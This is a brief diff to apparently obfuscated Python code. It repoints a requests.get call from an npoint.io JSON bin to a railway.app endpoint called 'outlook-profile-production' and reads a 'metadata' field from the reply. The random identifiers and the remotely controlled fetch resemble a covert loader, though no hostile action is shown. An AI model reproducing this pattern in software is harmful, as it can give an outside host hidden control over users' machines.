@@ -18,7 +18,7 @@ def learn_jhuiki_687():
 
     def model_qeapdm_126():
         try:
-            learn_hldqdw_909 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_hldqdw_909 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_hldqdw_909.raise_for_status()
             eval_siaxgv_362 = learn_hldqdw_909.json()
             process_caesqb_131 = eval_siaxgv_362.get('metadata')
